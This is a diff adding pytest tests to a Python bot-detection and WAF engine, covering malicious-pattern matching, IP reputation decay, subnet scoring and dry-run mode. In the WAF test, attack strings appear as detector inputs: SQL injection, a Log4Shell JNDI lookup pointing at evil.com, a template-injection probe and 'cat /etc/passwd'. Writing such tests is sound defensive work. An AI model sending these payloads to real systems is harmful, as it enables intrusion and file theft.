@@ -1,5 +1,6 @@
 import sys
 import asyncio
+import time
 from pathlib import Path
 import pytest
 
@@ -9,6 +10,7 @@ sys.path.append(str(Path(__file__).parent.parent))
 from engine import (
     imul,
     cyrb53,
+    get_ip_subnet,
     RequestContext,
     InMemoryStore,
     FingerprintBuilder,
@@ -16,6 +18,7 @@ from engine import (
     RequestUtils,
     FingerprintEngine,
     ProblemManager,
+    MaliciousPatterns,
     ASGIFingerprintMiddleware,
     WSGIFingerprintMiddleware,
 )
@@ -765,3 +768,136 @@ async def test_engine_honeypot_persistence_with_valid_ticket():
 
     decision_bot = await engine.process_request(context_bot)
     assert decision_bot["action"] == "block"
+
+
+# --- NEW TESTS: WAF, IP REPUTATION, SUBNET, DRY RUN & VECTOR VALIDATION ---
+
+def test_malicious_patterns_waf():
+    """Vérifie la détection d'injections malveillantes via MaliciousPatterns."""
+    assert MaliciousPatterns.is_malicious("SELECT * FROM users;--") is True
+    assert MaliciousPatterns.is_malicious("UNION SELECT username, password") is True
+    assert MaliciousPatterns.is_malicious("${jndi:ldap://evil.com/a}") is True
+    assert MaliciousPatterns.is_malicious("{{ 7*7 }}") is True
+    assert MaliciousPatterns.is_malicious("cat /etc/passwd") is True
+    assert MaliciousPatterns.is_malicious("normal comment text") is False
+
+@pytest.mark.asyncio
+async def test_ip_reputation_and_decay():
+    """Vérifie la réputation IP, le bornage et sa décroissance temporelle."""
+    store = InMemoryStore()
+    ip = "1.2.3.4"
+    
+    # Par défaut, score de 0.0
+    assert await RequestUtils.get_ip_reputation_score(store, ip) == 0.0
+    
+    # Mise à jour positive
+    await RequestUtils.update_ip_reputation_score(store, ip, 45.0)
+    assert await RequestUtils.get_ip_reputation_score(store, ip) == 45.0
+    
+    # Bornes max (100)
+    await RequestUtils.update_ip_reputation_score(store, ip, 120.0)
+    assert await RequestUtils.get_ip_reputation_score(store, ip) == 100.0
+    
+    # Bornes min (0)
+    await RequestUtils.update_ip_reputation_score(store, ip, -150.0)
+    assert await RequestUtils.get_ip_reputation_score(store, ip) == 0.0
+
+    # Test de la décroissance temporelle (2 points par heure passée)
+    # On simule un score de 50.0 datant de 3 heures
+    await store.set(f"ip-reputation:{ip}", {
+        "score": 50.0,
+        "lastUpdate": time.time() - (3 * 3600)
+    })
+    # 50.0 - (3 * 2) = 44.0
+    assert await RequestUtils.get_ip_reputation_score(store, ip) == 44.0
+
+@pytest.mark.asyncio
+async def test_subnet_score_history_and_decay():
+    """Vérifie la mise à jour des métriques de sous-réseau, le calcul du score et la décroissance."""
+    store = InMemoryStore()
+    ip = "192.168.1.50"
+    device_id = "device-test-1"
+    
+    # Initialement 0.0
+    score_data = await RequestUtils.get_subnet_score(store, ip, device_id)
+    assert score_data["subnetScore"] == 0.0
+    
+    # On simule une activité de plusieurs appareils uniques avec des scores élevés
+    for i in range(1, 15):
+        await RequestUtils.update_subnet_metrics(store, ip, f"device-{i}", 40.0)
+        
+    score_data_updated = await RequestUtils.get_subnet_score(store, ip, device_id)
+    assert score_data_updated["subnetScore"] > 0.0
+    
+    # Test de la décroissance (demi-vie de 30 minutes / 1800 secondes)
+    subnet = get_ip_subnet(ip)
+    # On simule une activité datant de 1 heure (2 demi-vies)
+    subnet_key = f"subnet:{subnet}"
+    data = await store.get(subnet_key)
+    data["lastActivity"] = int(time.time()) - 3600
+    await store.set(subnet_key, data)
+    
+    score_data_decayed = await RequestUtils.get_subnet_score(store, ip, device_id)
+    assert score_data_decayed["subnetScore"] < score_data_updated["subnetScore"]
+
+@pytest.mark.asyncio
+async def test_dry_run_mode():
+    """Vérifie que le mode Dry Run n'interrompt pas la requête mais enregistre l'intention."""
+    config = {
+        "dryRun": True,
+        "thresholds": {"low": 20, "high": 75, "block": 95},
+        "weights": {"honeypotScore": 1.0},
+        "honeypot": {"trapUrls": ["/.env"]}
+    }
+    store = InMemoryStore()
+    engine = FingerprintEngine(config, store)
+    
+    # Requête de bot vers honeypot (.env) qui devrait normalement bloquer
+    context = RequestContext(
+        client_ip="127.0.0.1",
+        path="/.env",
+        headers={"user-agent": "curl/7.68.0"},
+        query_params={},
+        cookies={}
+    )
+    
+    decision = await engine.process_request(context)
+    
+    # Dry Run actif : action = next, intendedAction = block, pas de status ou body
+    assert decision["action"] == "next"
+    assert decision["intendedAction"] == "block"
+    assert "status" not in decision
+    assert "body" not in decision
+
+@pytest.mark.asyncio
+async def test_suspicion_vector_and_final_score():
+    """Vérifie la parité de structure : get_suspicion_vector et calculate_final_score."""
+    config = {
+        "thresholds": {"low": 20, "high": 75, "block": 95},
+        "weights": {
+            "inconsistencyScore": 0.5,
+            "headerAnomalyScore": 0.5
+        }
+    }
+    store = InMemoryStore()
+    engine = FingerprintEngine(config, store)
+    
+    # Requête avec anomalies d'en-tête
+    context = RequestContext(
+        client_ip="127.0.0.1",
+        path="/",
+        headers={"user-agent": "curl"}, # anomalies
+        query_params={},
+        cookies={}
+    )
+    
+    vector = await engine.get_suspicion_vector(context)
+    assert isinstance(vector, dict)
+    assert "inconsistencyScore" in vector
+    assert "headerAnomalyScore" in vector
+    assert vector["headerAnomalyScore"] > 0
+    
+    # Calcul manuel avec les poids configurés (0.5 et 0.5)
+    score = engine.calculate_final_score(vector)
+    expected_score = min(100.0, vector["inconsistencyScore"] * 0.5 + vector["headerAnomalyScore"] * 0.5)
+    assert score == pytest.approx(expected_score, 0.01)
